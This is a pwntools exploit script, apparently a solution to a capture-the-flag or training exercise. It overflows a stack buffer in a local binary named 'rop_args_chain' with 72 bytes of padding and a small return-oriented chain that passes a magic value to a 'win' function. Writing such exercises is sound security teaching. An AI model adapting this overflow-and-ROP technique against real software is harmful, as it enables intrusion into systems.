#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./build/rop_args_chain", checksec=False)
context.log_level = "info"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process(elf.path, stdin=PIPE, stdout=PIPE)

offset = 72
magic = 0xdeadbeefcafebabe
pop_rdi = elf.symbols["pop_rdi_ret"]
win = elf.symbols["win"]

payload = flat(
    b"A" * offset,
    pop_rdi,
    magic,
    win,
)

io.sendlineafter(b"ROP level 2: call win(MAGIC)\n", payload)
out = io.recvall(timeout=2)
print(out.decode(errors="ignore"))
